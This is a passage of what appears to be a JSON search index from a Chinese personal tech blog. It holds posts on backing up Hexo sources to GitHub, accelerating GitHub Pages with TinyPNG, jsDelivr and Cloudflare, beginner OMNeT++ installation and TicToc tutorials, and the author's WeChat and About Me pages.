d上传到github。\n备份博客源文件有时候我们想换一台电脑继续写博客，这时候就可以将博客目录下的所有源文件都上传到github上面。\n首先在github博客仓库下新建一个分支hexo，然后git clone到本地，把.git文件夹拿出来，放在博客根目录下。\n然后git checkout hexo切换到hexo分支，然后git add .，然后git commit -m &amp;quot;xxx&amp;quot;，最后git push origin hexo提交就行了。\n下载我弄好的主题包大家也可以先用上文hexo安装方法安装完hexo，然后直接下载这个文件，放到theme文件夹里，这是我修改完的基本没bug的定制化的博客，且用了这篇博客里说的加速方式，就不用你自己搞了，就可以直接拿来用啦。\n其他定制选项可以看主题包作者写的这个\n","plink":"https://gwliang.com/2019/10/05/blog-jiao-cheng/"},{"title":"利用jsDelivr和Cloudflare免备案加速Github Pages网站","date":"2019-09-30T01:20:30.000Z","date_formatted":{"ll":"2019年9月30日","L":"2019/09/30","MM-DD":"09-30"},"updated":"2019-11-17T00:48:45.205Z","content":"利用jsDelivr和Cloudflare免备案加速Github Pages网站最近觉得学的东西不少，但是我从来没有记录过，最近正好因为新建了个博客，热乎劲还没过去，所以写点什么。\n我比较穷，不想买个服务器，买了也浪费，同时又想写博客。还不想通过CSDN，简书之类的“广告网站”来写东西（最近发现在手机上用Chrome浏览器看简书的内容的时候会有弹屏广告，而且关不掉，遂放弃了简书）。突然想起了好久之前看过的Github Pages，于是照着网上的教程进行了梳理，最终创建了一个我还比较满意的博客。只是有一个很严重的缺陷，就是国内访问太慢了，查了很多教程，发现都是些接入国内CDN的教程，国内CDN不仅贵，而且你不备案是不能用的。对于我这样一个没啥需求的用户，还得做网站备案，太麻烦了。于是想能不能曲线救国，最终找到了一个比较有效，能提高Github Pages速度的方法，还不用花钱（可能要花点，但是不多）。\n效果先上效果（两个网页均是通过 清空缓存并硬性重新加载 方式来测试的）\n\n\n对于速度，大家可以自行测试，本站和 blinkfox.github.io 使用的是同一套模板，对方9.9s时还没跳到主页，我站8s就已经全部加载完成。那我做了什么改动呢？\n第一步——压缩图片刚开始的时候没有头绪，因为不知道Github Pages能换域名。我一想，图片是显示的大头，先从压缩图片开始做起，刚好有一个公司 TinyPNG 提供了接口。首先我们需要打开它的官网，点击上面的 Developer API，输入你的名字和Email就可以获得每月500次的免费试用API的资格，你放心，这个量对于我们这种写小博客的人来说是非常够用的。申请完了之后要写个压缩的小程序。对于我来说，做个小程序还是轻而易举的，我在这里使用python来简单写写。根据官方文档说明，你首先需要下载它的库\n\npip install --upgrade tinify\n\n然后就可以应用我这个遍历程序啦(突然发现被我删啦，重新写吧)\n12345678910111213141516171819202122import tinifyimport ostinify.key = \"YOUR_API_KEY\"def tinify_all_pic(rootdir):    _files = []    list = os.listdir(rootdir)    for i in range(0, len(list)):        path = os.path.join(rootdir, list[i])        if os.path.isdir(path):            tinify_all_pic(path)        if os.path.isfile(path):            suffix = os.path.splitext(path)[-1]            if suffix == '.png' or suffix == '.jpg':                print(path)                source = tinify.from_file(path)                source.to_file(path)tinify_all_pic(r\"themes\\hexo-theme-matery\\source\")# 这里是用我存放资源的一个文件夹做示范，根据你们的文件夹不同进行相应的更换\n\n压缩率通常在50%以上（特别是你用超过1M以上的图片的时候），这样你在加载的时候不就提高50%的加载速度了嘛😂（不是）。\n这样操作之后你的加载速度可以提高至少20%以上（一些模板资源也被压缩了，有些图片没法用网页URL来代替）。\n第二步——使用jsDelivr对博客静态资源进行静态加速\njsDelivr是一个很著名的CDN加速商，这个服务商只对你GitHub里的静态资源进行加速，但是不和Cloudflare一样免费提供全站加速，不过Cf在国内没有节点，这个公司在中国是依托网宿科技（QUANTIL）进行CDN加速。\n\n但是这也够了，也是提升我们速度的一个大杀器（Cloudflare只是起辅助作用）。首先你需要先传一个你网站编译完后的稳定版本放在你的GitHub里，这样就可以进行加速了。我们只需要通过这样来引用你的资源\n\nhttps://cdn.jsdelivr.net/gh/user/repo@version/file\n\n举个例子，如果我们直接引用网站的资源是这样引用的。\n\nhttps://github.com/gaowanliang/gaowanliang.github.io/blob/master/js/matery.js\n\n其中 gaowanliang 是我的用户名，gaowanliang.github.io 是我的仓库名，那这样就可以进行套进去，效果就是这样:\n\nhttps://cdn.jsdelivr.net/gh/gaowanliang/gaowanliang.github.io/js/matery.js\n\n甚至如果你是js，css文件，可以进行min化，哪怕你的仓库里没有min的文件\n\nhttps://cdn.jsdelivr.net/gh/gaowanliang/gaowanliang.github.io/js/matery.min.js\n\n简单来说，如果你的文件放在master分支里，点开文件复制链接把链接里的 https://github.com/ 换成 https://cdn.jsdelivr.net/gh/ ，然后把 blob/master/ 删掉即可，然后就可以对你网站里的js，css，图片大换特换啦。你比如说这个模板的作者把用到的js，css都写在了 _config.yml 里，我们就可以进行全部替换\n\n里面的图片也可以进行替换\n\n这样你的加载速度还能再上一个台阶。\n第三步——使用Cloudflare进行全站加速因为Cf在国内没有节点，所以可能出现不加速反而减速的效果，但是有总比没有好，这里就简单说一说。\n首先你需要注册一个域名，国内国外都有相关的域名的注册商这里就不详述了，因为手头没有空闲的域名了，这里就用这篇博客和这篇博客的内容进行介绍。\n注册 Cloudflare 账号要使用 Cloudflare 的服务，我们先要到官网注册账号：Cloudflare 注册\n\n点击 Sign Up 注册，填写邮箱和密码即可。之后填上你要加速的博客主域名，然后点击 Add Site 添加。\n\n\nCloudflare 在查询域名的 DNS 记录，点击 Next 继续，选择免费套餐\n\n\n这里我们是免费套餐，可以无视直接点击 Confirm 确认。\n\n修改 DNS 域名服务器这里是域名的 DNS 记录查询结果，如有遗落，可自行添加。建议所有全部访问都通过 CDN 加速，其余默认，确认后继续。\n\n然后去你的域名提供商修改默认域名服务器为 Cloudflare 提供的，修改后继续，更改成功需要几分钟或更长的时间。时不时 Check 一下。\n\n更换到你的自定义域名首先我们需要在仓库的设置里填入自定义域名，如下图：\n\n此时访问 example.zfanw.com，浏览器会提示：\n\nexample.zfanw.com’s server IP address could not be found.\n\nIP 地址未找到 - 因为我们还没做任何 DNS 解析的工作。\n绑定 CNAME一般情况下，我们是添加 A 记录将域名指向 IP。但 Github Pages 是通过 CNAME 绑定的 - CNAME 指 Canonical Name record，其实就是域名的别名。\n在 DNS 管理中添加一条 CNAME 记录，将 example 子域名指向 chenxsan.github.io\n然后就成功了\n享受一下吧经过加速后你的网站就可以达到我说的速度啦，虽然没有很快，但是在免备案的情况下达到这个速度已经很好了（总比10s才相应网页好吧）。当然我还在想办法继续优化，有新方法还会更新的。\n","plink":"https://gwliang.com/2019/09/30/加速Github-Pages网站/"},{"title":"OMNET++入门教程|第1章 —— TicToc模型","date":"2019-09-26T14:05:28.000Z","date_formatted":{"ll":"2019年9月26日","L":"2019/09/26","MM-DD":"09-26"},"updated":"2019-11-17T00:48:45.196Z","content":"官方教程链接\nOMNET++入门教程|第1章 —— TicToc模型1 模型首先，让我们从一个由两个节点组成的“网络”开始。节点将做一些简单的事情：其中一个节点将创建一个数据包，两个节点将继续来回传递相同的数据包。我将调用节点tic和toc。稍后我们将逐步改进这个模型，在每个步骤中来引入OMNET++特性。\n以下是从零开始实现第一个模拟的步骤。\n2 建立项目首先打开OMNET++的主界面，在主菜单中选择 File-&gt; New -&gt; OMNeT++ Project \n\n然后会出现这个界面\n\nProject name输入TT（官方直接有一个tictoc，如果输入tictoc就直接进入它的例子了，这里我们尝试从头开始写），其他的保持默认即可，点击Next（别点错成Finish），在让你选择 initial content时，选择 Empty project，然后一路Next，最后无法选择Next时选择Finish。最后的效果如图\n\n3 添加NED文件OMNeT ++使用NED文件来定义组件并将它们组装成更大的单元，例如网络。我们开始通过添加NED文件来实现我们的模型。要将文件添加到项目中，请在左侧的项目资源管理器面板中右键单击项目目录 ，然后从菜单中选择 File-&gt; New -&gt; Network Description File (NED)。下面的 File name输入tt.ned，然后点击Finish即可\n\n\n然后就可以开始构建网络了，切换到 Source 模式，然后输入以下内容：\n12345678910111213141516171819202122simple Txc1&#123;    gates:        input in;        output out;&#125;//// Two instances (tic and toc) of Txc1 connected both ways.// Tic and toc will pass messages to one another.//network Tictoc1&#123;    submodules:        tic: Txc1;        toc: Txc1;    connections:        tic.out --&gt; &#123;  delay = 100ms; &#125; --&gt; toc.in;        tic.in &lt;-- &#123;  delay = 100ms; &#125; &lt;-- toc.out;&#125;\n\n然后切换回 Design 模式，就会看到类似如下的场景\n\n那我们来看一下两块代码是什么意思\n首先，第一块定义了一个简单模块Txc1\n第二块定义了一个复合模块(类型) Tictoc1,其中包含子模块tic和toc,它们都是简单模块类型Txc1的实例。Tic的输出门(out)连接到toc的输入门(in),Toc的输出门(out)连接到tic的输入门(in) ,传输延迟均为100ms。\n4 添加C++文件现在，我们需要在C++中实现Txc1简单模块的功能。从项目的菜单中选择 File -&gt; Other,然后在下面的选择栏里选择 C/C++ -&gt; Source File ，创建一个名为txc1.cc的文件，并输入以下内容：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;string.h&gt;#include &lt;omnetpp.h&gt;using namespace omnetpp;/** * Derive the Txc1 class from cSimpleModule. In the Tictoc1 network, * both the `tic' and `toc' modules are Txc1 objects, created by OMNeT++ * at the beginning of the simulation. */class Txc1 : public cSimpleModule&#123;  protected:    // The following redefined virtual function holds the algorithm.    virtual void initialize() override;    virtual void handleMessage(cMessage *msg) override;&#125;;// The module class needs to be registered with OMNeT++Define_Module(Txc1);void Txc1::initialize()&#123;    // Initialize is called at the beginning of the simulation.    // To bootstrap the tic-toc-tic-toc process, one of the modules needs    // to send the first message. Let this be `tic'.    // Am I Tic or Toc?        //仿真初始化，由节点tic发出第一条消息    if (strcmp(\"tic\", getName()) == 0) &#123;        // create and send first message on gate \"out\". \"tictocMsg\" is an        // arbitrary string which will be the name of the message object.        //创建输出门“out”发出第一条消息\"tictocMsg\"，不过发的啥这里并不关心        cMessage *msg = new cMessage(\"tictocMsg\");        send(msg, \"out\");    &#125;&#125;void Txc1::handleMessage(cMessage *msg)&#123;    // The handleMessage() method is called whenever a message arrives    // at the module. Here, we just send it to the other module, through    // gate `out'. Because both `tic' and `toc' does the same, the message    // will bounce between the two.    send(msg, \"out\"); // send out the message&#125;\n\n\n\n\n根据 NED 文件中定义的字模块关系，initialize() 函数中节点 tic 从输出门“out”发出的消息经过 100ms 传输延迟必然到达节点 toc的输入门“tic”，并触发其 handleMessage() 函数。 不难看出该消息就像一只乒乓球，将在两个节点间来回传输。不过请注意，此模拟中没有内置停止条件：它将永远持续。你可以在IDE上让它停止运行。\n5 配置omn​​etpp.ini为了能够运行模拟，我们需要创建omnetpp.ini文件。omnetpp.ini告诉仿真程序要模拟哪个网络（因为ned文件可能包含多个网络），可以将参数传递给模型，显式指定随机数生成器的种子等。\n从菜单里选择 File -&gt; New -&gt; Initialization file (INI) 创建omnetpp.ini文件。新文件将在IniFile编辑器中打开。作为ned编辑器，inifile编辑器还有两种模式，Form和Source，用于编辑相同的内容。前者更适合配置仿真内核，后者更适合输入模块参数。\n现在，只需切换到 Source 模式并输入以下内容：\n12[General]network &#x3D; Tictoc1\n\n\n点击 Run 或使用快捷键 Ctrl+F11 运行，可能弹出两个提示框，不用管他，直接运行即可，最后会弹出一个窗口来显示仿真结果，效果如图。\n\n下一节我会着重讲一下模拟的过程。就说到这里吧，有什么问题大家可以通过评论区联系我。\n","plink":"https://gwliang.com/2019/09/26/omnet-ru-men-jiao-cheng-2/"},{"title":"OMNET++入门教程|第0章——安装","date":"2019-09-24T14:05:28.000Z","date_formatted":{"ll":"2019年9月24日","L":"2019/09/24","MM-DD":"09-24"},"updated":"2019-11-17T00:48:45.205Z","content":"OMNET++入门教程|第0章——安装最近需要学的东西不少，于是准备写点什么。正好最近在研究通信协议方面的知识，老师建议学一学OMNET++，正好网上的相关资料比较少，我自己也写点什么。\n下载首先第一步去官网下载，打开 OMNET++的官网，选择右上角的Download，选择合适的版本来进行下载，比如我就是Windows 10 64位，就需要下载Windows版本\n\n安装下载完成后是一个压缩包，在合适的目录解压后，第一次遇到下载软件的压缩包里面没有安装包，感觉还是束手无策的，赶紧上网查了查，终于知道了具体怎么安装，首先先给一张图片\n\n这个图片写的已经很清楚了，首先双击运行mingwenv.cmd，然后文件会自动解压，按照其他网站的理论，可能你需要先安装G++之类的编译器，但是我没有遇到这个情况，如果有人遇到什么情况也可以在评论区留言给我。\n编译运行第二步就是输入./configure这个命令，它会自动执行，最后出现 Good！ 之类的话，说明这一步成功了。然后接着输入make命令来进行编译，时间非常长，耐心等待，等屏幕上输出 Now you can type “omnetpp” to start the IDE 字样，说明安装完成了，可以直接输入omnetpp打开IDE。然后因为我比较懒，相信它应该有实体的exe，然后就找了起来。这个时候我其实下意识的进入./bin这个文件夹，因为这个文件夹通常是用来存放二进制文件的，但是发现里面没有IDE，是因为其实这个软件没有IDE应该也能运行（我想不出一个仿真软件在没有IDE的情况下是怎么仿真的），真正的IDE是在./ide这个文件夹当中的，这个时候可以建立一个快捷方式放在根目录，更方便。就不用每次通过进命令行输入omnetpp进入IDE了。\n\n感想具体安装过程虽然不如安装包点点简单，但是还是蛮简单的，但是我没有在官方文档找到相关教程，可能还是有点欠缺吧。就说到这里吧，有什么问题大家可以通过评论区联系我，或者直接通过右面的Daovoice联系我（最好是评论区，那个我可能不看），下次我将介绍一个简单的例子来入门OMNET++。\n","plink":"https://gwliang.com/2019/09/24/omnet-ru-men-jiao-cheng/"},{"title":"高玩梁的微信公众号","date":"2019-11-22T09:50:51.000Z","date_formatted":{"ll":"2019年11月22日","L":"2019/11/22","MM-DD":"11-22"},"updated":"2019-12-12T13:56:37.124Z","content":"\n这是我的个人微信公众号，主要是分享各种科技，IT相关知识，干货。通过轻松的教程和简单的例子方便人们更好的学习计算机知识。\n我每晚都会看后台数据，如果有问题可以在公众号里随时提问。\n","plink":"https://gwliang.com/wechat-subscription/"},{"title":"关于我 About Me","date":"2019-11-22T09:50:51.000Z","date_formatted":{"ll":"2019年11月22日","L":"2019/11/22","MM-DD":"11-22"},"updated":"2019-11-29T10:48:35.242Z","content":"一、基本信息\n\n\n昵称：高玩梁\n性别：男\n年龄：19岁\n职业：学生\n爱好：\n计算机技术\n动漫\n视频制作\n电子技术 \n小提琴 \n\n\n二、教育经历本科阶段2018.9 — 至今\n学校：山东科技大学\n院系：信息工程系\n专业：电子信息科学与技术\n三、技术介绍本人仍处于学生阶段，没有针对某一个方向生成自己的一套技术栈\n目前学过的编程语言如下\nPython\nGolang\nJavascript / HTML / CSS\nC/C++（算法方面）\nMatlab\n初步学习过Linux下的运维，下面想到什么在写😂\n","plink":"https://gwliang.com/about/"}]